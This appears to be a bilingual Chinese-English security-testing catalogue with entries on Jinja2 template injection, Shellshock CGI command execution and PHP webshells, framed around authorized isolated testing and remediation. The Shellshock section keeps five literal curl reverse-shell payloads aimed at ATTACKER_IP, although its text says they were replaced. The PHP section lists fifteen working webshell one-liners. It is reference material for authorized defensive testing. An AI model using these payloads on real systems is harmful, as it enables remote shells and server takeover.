description.zh: 实施“禁止将用户内容作为模板源码，使用固定模板和数据参数；启用并收紧沙箱属性策略，以低权限运行并阻止模板进程创建子进程”后重放算术、合法变量和原对象链，确认渲染保留且对象遍历被拒绝。
description.en: Apply never compile user content as template source, use fixed templates with data parameters, enforce strict sandbox attribute policy, run with least privilege, and prevent template workers from spawning processes, then replay arithmetic, valid variables, and original chains to preserve rendering while denying object traversal.

review.rationale: Jinja2 SSTI 进程执行链保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已用无害算术确认“Jinja2 SSTI 进程执行链”存在模板源码求值，并记录 Jinja2/Flask 版本、沙箱和可见对象，满足：不可信字符串由 Jinja2 当作模板源码编译，沙箱未启用或对象属性策略可绕过，进程账户允许创建子进程。
prerequisites.en: Harmless arithmetic confirms template-source evaluation for Jinja2 SSTI Process Execution Chains; Jinja2 or Flask versions, sandboxing, and exposed objects are recorded, and an untrusted string is compiled as Jinja2 template source, sandboxing is absent or attribute policy is bypassable, and the process identity can create child processes.

prerequisites.zh: 一次性模板 worker 可记录属性拒绝、渲染、子进程审计和模板表达式解析路径、渲染日志、子进程固定标记与同一请求 ID 完整关联。
prerequisites.en: A disposable template worker can record denied attributes, rendering, child-process auditing, and the template resolution path, render log, fixed child-process marker, and request identifier fully correlate.

analysis.zh: 阳性要求模板源码逐步到达 globals/类型对象，再到进程 API，并取得模板表达式解析路径、渲染日志、子进程固定标记与同一请求 ID 完整关联。算术成立、对象名回显、subclasses 索引报错或反连字符串被渲染均是假阳性，不能证明“模板上下文是否暴露 request、应用 globals、Python 类型对象或 builtins，并允许解析链调用 os 或 subprocess”。
analysis.en: A positive traces template source through globals or type objects to a process API and obtains the template resolution path, render log, fixed child-process marker, and request identifier fully correlate. Arithmetic, reflected object names, subclass-index errors, or rendered reverse-command strings are false positives and do not prove whether template context exposes request, application globals, Python type objects, or builtins and permits a resolution chain to os or subprocess.

opsecTips.zh: Jinja2 SSTI 进程执行链停止条件：所有反连动作替换为固定 stdout 标记；worker 创建非预期进程、联网或访问真实文件时立即销毁并停止。 本条重点观察“模板上下文是否暴露 request、应用 globals、Python 类型对象或 builtins，并允许解析链调用 os 或 subprocess”。
opsecTips.en: Jinja2 SSTI Process Execution Chains stop condition: Replace reverse behavior with a fixed stdout marker; destroy the worker and stop on unexpected processes, network, or real-file access. The entry-specific focus is whether template context exposes request, application globals, Python type objects, or builtins and permits a resolution chain to os or subprocess.

opsecTips.zh: Jinja2 SSTI 进程执行链清理条件：结束后删除测试模板和缓存、轮换临时会话、重建 worker，并确认 globals、调试器和测试路由未残留。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Jinja2 SSTI Process Execution Chains cleanup condition: Delete test templates and caches, rotate temporary sessions, rebuild the worker, and verify globals, debuggers, and test routes are removed. Recheck that no triggerable state remains for this technique.

name.zh: Shellshock CGI 环境变量命令执行

description.zh: 通过 curl 将 Shellshock 函数定义和固定标记放入 Cookie 或 User-Agent，验证 CGI 是否把请求头映射为环境变量并交给存在缺陷的 Bash 解析；curl 只是投递器，审核后的五行仅访问本机隔离实例。
description.en: Uses curl to place a Shellshock function definition and fixed marker in Cookie or User-Agent, testing whether CGI maps the header into an environment variable parsed by vulnerable Bash; curl is only the delivery client, and all five reviewed requests target a local isolated instance.

overview.zh: Shellshock CGI 环境变量命令执行用于验证 CVE-2014-6271 的完整数据流：HTTP Cookie 或 User-Agent 经 CGI 转换为环境变量，CGI 脚本或其子进程再启动存在缺陷的 Bash，Bash 导入函数定义时错误执行尾随文本。适用前提是明确授权的隔离旧版 Bash CGI 实例、可核验的 Bash 补丁状态、可观察的 CGI 子进程日志，以及替代反连命令的无副作用固定标记。只有请求头、CGI 进程、Bash 版本和固定输出属于同一次请求时才可判定。
overview.en: Shellshock CGI Environment-Variable Command Execution validates the complete CVE-2014-6271 flow: an HTTP Cookie or User-Agent becomes a CGI environment variable, a CGI script or child launches vulnerable Bash, and Bash incorrectly executes text trailing an imported function definition. It requires an explicitly authorized isolated legacy Bash CGI instance, verifiable patch status, observable CGI child-process logs, and a side-effect-free fixed marker replacing reverse-shell commands. A finding requires the header, CGI process, Bash version, and fixed output to correlate to one request.

vulnerability.zh: 漏洞根因是受影响 Bash 在从环境变量恢复函数时没有在函数体结束处停止解析，导致函数定义后的命令也被执行。CGI 服务器通常把请求头转换为 HTTP_COOKIE、HTTP_USER_AGENT 等环境变量；只有后续组件确实调用受影响 Bash 时，这条输入链才成立。CGI 可访问、服务器使用其他 Shell、Bash 已修复或请求头只被日志记录时，不构成该 RCE。
vulnerability.en: The flaw exists because affected Bash versions fail to stop parsing after restoring a function from an environment variable and execute commands following the function body. CGI servers commonly map headers to variables such as HTTP_COOKIE and HTTP_USER_AGENT, but the chain exists only when a downstream component invokes affected Bash. A reachable CGI, a different shell, patched Bash, or header logging without Bash parsing does not establish this RCE.

exploitation.zh: 原始五行均会尝试建立交互式反连，审核时已通过 command override 保留 Cookie/User-Agent、函数定义和 CGI 路径结构，并把尾随部分替换为本地 printf 固定标记、127.0.0.1 隔离目标和五秒超时。逐个 Header 和 CGI 路径低频验证，并与已修复 Bash 实例对照；任何外连、Shell、写文件或真实数据读取都不是本条所需证据。
exploitation.en: All five source lines attempted interactive reverse connections. The reviewed command override preserves the Cookie or User-Agent, function definition, and CGI path structure while replacing the tail with a local printf marker, a 127.0.0.1 isolated target, and a five-second timeout. Test one header and CGI path at low rate against affected and patched Bash controls; no egress, shell, file write, or real-data read is required evidence.

mitigation.zh: 升级 Bash 到供应商已修复版本并重启所有长期运行进程，移除不必要的 CGI，避免 CGI 脚本或其子进程调用 Bash，并限制传入解释器的环境变量。WAF 对函数定义头的拦截只能作为纵深防御。修复后以同一固定标记重放 Header，确认 CGI 正常业务仍工作，而已修复实例不执行尾随文本且进程日志中没有异常子 Shell。
mitigation.en: Upgrade Bash to a vendor-fixed build and restart long-lived processes, remove unnecessary CGI, avoid Bash invocation from CGI scripts or children, and constrain environment variables passed to interpreters. Blocking function-definition headers at a WAF is defense in depth only. Replay the same fixed marker after remediation to preserve normal CGI behavior while proving trailing text is not executed and no unexpected child shell appears.

title.zh: 确认 CGI 到 Bash 的 Shellshock 入口
title.en: Confirm the Shellshock CGI-to-Bash entry

description.zh: 定位接收 Cookie 或 User-Agent 的 CGI 路径，确认请求头被映射为环境变量，记录实际启动的 Shell、Bash 版本、补丁包和 CGI 服务身份。
description.en: Locate the CGI path receiving Cookie or User-Agent, confirm header-to-environment mapping, and record the invoked shell, Bash version, vendor patch, and CGI service identity.

title.zh: 建立已修复与受影响 Bash 对照
title.en: Establish patched and affected Bash controls

description.zh: 用普通 Header 记录正常 CGI 行为，再在隔离实例分别对已修复和受影响 Bash 使用相同一次性 printf 标记，保存请求 ID、环境变量和子进程日志。
description.en: Record normal CGI behavior with an ordinary header, then use the same one-time printf marker against patched and affected Bash in isolation, retaining request identifiers, environment variables, and child-process logs.

title.zh: 逐行验证 Shellshock Header 变体
title.en: Validate Shellshock header variants line by line

description.zh: 以下五行已由 command override 去除反连 Shell，仅保留本地固定 marker、Header 分隔形式和 CGI 路径差异；逐条执行并关联请求 ID、CGI 环境和 Bash 子进程日志。
description.en: The command override removes reverse shells from all five lines and retains only a local fixed marker plus header-separator and CGI-path variants; run each separately and correlate the request identifier, CGI environment, and Bash child-process log.

attackChain.payload:
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' http://TARGET/cgi-bin/test.sh
curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'" "http://TARGET/cgi-bin/evil.sh"
curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'" "http://TARGET/cgi-bin/evil.cgi"
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'" "http://TARGET/cgi-bin/evil.sh"
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'" "http://TARGET/cgi-bin/evil.sh"

title.zh: 修复 Bash 与 CGI 边界并回归
title.en: Remediate and regress the Bash and CGI boundary

description.zh: 安装供应商 Bash 修复、重启相关进程并移除不必要 CGI 后，从同一入口重放普通 Header 和固定标记，确认业务响应保留、尾随文本不执行且无异常子 Shell。
description.en: After installing the vendor Bash fix, restarting affected processes, and removing unnecessary CGI, replay the ordinary header and fixed marker through the same entry to preserve business responses while trailing text does not execute and no unexpected child shell appears.

review.rationale: Shellshock CGI 环境变量命令执行保留为 RCE Payload：curl 只是投递器，核心输入是进入 CGI 环境变量并由受影响 Bash 解析的函数定义与尾随命令；原五行反连命令已由 command override 替换为本地固定 marker。

prerequisites.zh: 目标是明确授权的隔离 CGI 实例，请求头会映射为环境变量，CGI 脚本或子进程实际调用 Bash，并且 Bash 版本与供应商补丁状态可以核验。
prerequisites.en: The target is an explicitly authorized isolated CGI instance where headers become environment variables, a CGI script or child actually invokes Bash, and the Bash version and vendor patch status are verifiable.

prerequisites.zh: command override 已将反连尾随命令替换为本地一次性 printf 标记，并可关联 curl 详细请求、CGI 环境、子进程日志和已修复实例对照。
prerequisites.en: The command override replaces the reverse-shell trailing command with a local one-time printf marker, and verbose curl output, CGI environment, child-process logs, and a patched control can be correlated.

analysis.zh: 阳性必须证明受影响 Bash 从该请求对应的 CGI 环境变量恢复函数时执行了固定尾随标记，并由相同请求 ID 的 Header、环境快照、CGI 子进程日志和标记输出共同佐证。仅有 CGI 200/500、函数定义被回显或记录、Bash 版本字符串、curl 请求成功、未关联的网络连接，或在已获得 Shell 中手工执行命令，均不能证明 Shellshock RCE。
analysis.en: A positive requires proof that affected Bash executed the fixed trailing marker while restoring a function from the CGI environment for that request, corroborated by the same request identifier, header, environment snapshot, CGI child log, and marker output. CGI 200 or 500, reflected or logged function syntax, a Bash version string, a successful curl request, an uncorrelated connection, or manual command execution in an existing shell does not prove Shellshock RCE.

opsecTips.zh: Shellshock CGI 环境变量命令执行停止条件：原五行反连命令只允许离线保存，不得直接执行；复验仅使用本地固定 marker。出现外连、交互 Shell、文件写入、真实数据返回、进程异常或服务不稳定时立即停止并记录请求 ID。
opsecTips.en: Shellshock CGI Environment-Variable Command Execution stop condition: retain the five reverse-shell lines offline only and never replay them directly; validation uses a local fixed marker. Stop and record the request identifier on egress, an interactive shell, file writes, real-data return, process anomalies, or service instability.

opsecTips.zh: Shellshock CGI 环境变量命令执行清理条件：删除固定 marker 和测试 CGI，清理含测试 Header 的缓存与临时日志，关闭任何本地监听器，恢复 CGI 配置并销毁旧 Bash 实例；最后确认没有遗留子进程或环境变量。
opsecTips.en: Shellshock CGI Environment-Variable Command Execution cleanup condition: remove fixed markers and test CGI files, clear caches and temporary logs containing test headers, close local listeners, restore CGI configuration, and destroy the legacy Bash instance; finally confirm no child process or environment variable remains.

name.zh: PHP 请求参数 WebShell

description.zh: 覆盖 system、shell_exec、passthru、反引号、动态函数与历史 eval/assert 形式，验证上传或写入的 PHP 文件是否把请求参数解释为代码或命令。
description.en: Covers system, shell_exec, passthru, backticks, dynamic functions, and legacy eval or assert forms to test whether an uploaded or written PHP file interprets request parameters as code or commands.

overview.zh: PHP 请求参数 WebShell用于核对PHP 文件是否由服务器解释，并把 GET 或 POST 参数传给命令执行、动态函数或代码求值结构。该条目只在以下前提下适用：攻击者可将 PHP 内容写入可访问且可执行位置，服务器处理器映射到 PHP，并且请求参数到达危险函数。有效判定必须取得最终规范文件名、PHP 处理器日志、一次性固定输出和对应请求参数能够关联；代码片段存在、请求返回 200 或单纯字符串回显都不能证明远程代码执行。
overview.en: PHP Request-Parameter Webshells checks whether the server interprets a PHP file and passes GET or POST values to command execution, dynamic functions, or code evaluation. It applies when an attacker can place PHP content in an accessible executable location, the server maps it to PHP, and request parameters reach dangerous functions. A valid finding requires the final canonical filename, PHP handler log, one-time fixed output, and corresponding request parameter correlate; source snippets, an HTTP 200 response, or simple reflection do not prove remote code execution.

vulnerability.zh: 风险根因是攻击者可将 PHP 内容写入可访问且可执行位置，服务器处理器映射到 PHP，并且请求参数到达危险函数，使应用可能暴露“PHP 文件是否由服务器解释，并把 GET 或 POST 参数传给命令执行、动态函数或代码求值结构”这一运行时边界。审计必须把入口、最终 API、服务身份、平台版本和进程或文件证据连续关联，避免把已经具备本地执行能力的后续命令误报成初始漏洞。
vulnerability.en: The risk exists when an attacker can place PHP content in an accessible executable location, the server maps it to PHP, and request parameters reach dangerous functions, exposing the runtime boundary of whether the server interprets a PHP file and passes GET or POST values to command execution, dynamic functions, or code evaluation. Review must correlate the entry, final API, service identity, platform version, and process or file evidence so post-execution commands are not misreported as the initial vulnerability.

exploitation.zh: 在隔离上传实例使用仅输出固定标记的替代文件，逐个区分命令函数、动态调用和历史求值语法，记录 PHP 版本与无效行。测试仅使用一次性、无副作用的固定标记，每轮只验证一种 API 或运行时分支，并记录调用栈、标准输出、子进程或文件审计；一旦出现非预期写入、网络连接或权限变化立即停止。
exploitation.en: use a replacement file that only emits a fixed marker in an isolated upload instance, separate command functions, dynamic calls, and legacy evaluation syntax, and record PHP version plus invalid lines. Use one-time side-effect-free markers, validate one API or runtime branch per run, and retain call stacks, stdout, child-process, or file audit evidence; stop on unintended writes, connections, or privilege changes.

mitigation.zh: 将上传文件存于 Web 根目录外并设为不可执行，移除动态命令接口，按上下文处理参数，升级 PHP 并删除 assert/create_function 等旧路径。修复后使用相同入口重放正常业务参数和最小异常样例，确认合法功能保留，同时危险 API 不再接受可控值，服务账户也无法通过替代路径创建进程或读取越界文件。
mitigation.en: store uploads outside the web root as non-executable objects, remove dynamic command interfaces, handle parameters by context, upgrade PHP, and remove legacy assert or create_function paths. Replay normal business parameters and minimized abnormal cases through the same entry to preserve legitimate behavior while preventing controllable values from reaching dangerous APIs or alternate process and file paths.

title.zh: 确认“PHP 请求参数 WebShell”执行入口
title.en: Confirm the PHP Request-Parameter Webshells execution entry

description.zh: 定位真实输入、处理器与最终 API，核对前提“攻击者可将 PHP 内容写入可访问且可执行位置，服务器处理器映射到 PHP，并且请求参数到达危险函数”，并记录运行时版本和服务身份。
description.en: Locate the real input, handler, and final API, confirm that an attacker can place PHP content in an accessible executable location, the server maps it to PHP, and request parameters reach dangerous functions, and record runtime version and service identity.

title.zh: 建立“PHP WebShell 请求处理”安全基线
title.en: Establish the PHP Webshell Request Handling baseline

description.zh: 使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“最终规范文件名、PHP 处理器日志、一次性固定输出和对应请求参数能够关联”作为异常证据。
description.en: Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting the final canonical filename, PHP handler log, one-time fixed output, and corresponding request parameter correlate as abnormal evidence.

title.zh: 逐行验证“PHP 请求参数 WebShell”
title.en: Validate PHP Request-Parameter Webshells line by line

description.zh: 测试步骤为：在隔离上传实例使用仅输出固定标记的替代文件，逐个区分命令函数、动态调用和历史求值语法，记录 PHP 版本与无效行。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。
description.en: use a replacement file that only emits a fixed marker in an isolated upload instance, separate command functions, dynamic calls, and legacy evaluation syntax, and record PHP version plus invalid lines. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker.

attackChain.payload:
<?php system($_GET['cmd']); ?>
<?php system($_GET[1]); ?>
<?php eval($_POST[cmd]);?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php echo passthru($_GET['cmd']); ?>
<?=`$_GET[1]`?>
<?=`$_GET[0]`?>
<?php $_GET['a']($_GET['b']); ?>
<?php $_POST['a']($_POST['b']);?>
<?php @eval(base64_decode($_POST['z'])); ?>
<?php $func=create_function('',$_POST[a]);$func();?>
<?php call_user_func('assert',$_POST[a]);?>
<?php array_map('assert',(array)$_POST[a]);?>
<% eval request("a") %>
<script language="php">system("id"); </script>

title.zh: 修复运行时边界并回归
title.en: Remediate and regress the runtime boundary

description.zh: 实施“将上传文件存于 Web 根目录外并设为不可执行，移除动态命令接口，按上下文处理参数，升级 PHP 并删除 assert/create_function 等旧路径”后重放正常与异常基线，确认业务功能保留且危险进程或文件能力不再可控。
description.en: After applying store uploads outside the web root as non-executable objects, remove dynamic command interfaces, handle parameters by context, upgrade PHP, and remove legacy assert or create_function paths, replay normal and abnormal baselines to preserve business behavior while dangerous process or file capabilities are no longer controllable.

review.rationale: PHP 请求参数 WebShell保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已在授权隔离环境定位“PHP 请求参数 WebShell”的真实输入点、处理器和运行时版本，并确认：攻击者可将 PHP 内容写入可访问且可执行位置，服务器处理器映射到 PHP，并且请求参数到达危险函数。
prerequisites.en: The authorized isolated environment identifies the real input, handler, and runtime version for PHP Request-Parameter Webshells, confirming that an attacker can place PHP content in an accessible executable location, the server maps it to PHP, and request parameters reach dangerous functions.

prerequisites.zh: 测试 worker 可随时销毁，并能同时观察最终规范文件名、PHP 处理器日志、一次性固定输出和对应请求参数能够关联。
prerequisites.en: The test worker is disposable and can observe the final canonical filename, PHP handler log, one-time fixed output, and corresponding request parameter correlate.

analysis.zh: 阳性要求可控输入连续到达危险运行时 API，并取得最终规范文件名、PHP 处理器日志、一次性固定输出和对应请求参数能够关联。代码片段、语法错误、HTTP 200、参数回显，或在已有本地 Shell 中手工运行命令均属假阳性或前置能力，不能证明“PHP 文件是否由服务器解释，并把 GET 或 POST 参数传给命令执行、动态函数或代码求值结构”。
analysis.en: A positive requires a continuous path from controllable input to a dangerous runtime API plus the final canonical filename, PHP handler log, one-time fixed output, and corresponding request parameter correlate. Snippets, syntax errors, HTTP 200, reflection, or manual commands after an existing shell are false positives or prerequisites and do not prove whether the server interprets a PHP file and passes GET or POST values to command execution, dynamic functions, or code evaluation.

opsecTips.zh: PHP 请求参数 WebShell停止条件：“PHP 请求参数 WebShell”只允许使用一次性固定标记；出现非预期子进程、外部网络、文件写入或权限变化时，立即终止 worker 并停止测试。 本条重点观察“PHP 文件是否由服务器解释，并把 GET 或 POST 参数传给命令执行、动态函数或代码求值结构”。
opsecTips.en: PHP Request-Parameter Webshells stop condition: Use only a one-time fixed marker for PHP Request-Parameter Webshells; terminate the worker and stop on unexpected child processes, external network, writes, or privilege changes. The entry-specific focus is whether the server interprets a PHP file and passes GET or POST values to command execution, dynamic functions, or code evaluation.

opsecTips.zh: PHP 请求参数 WebShell清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。
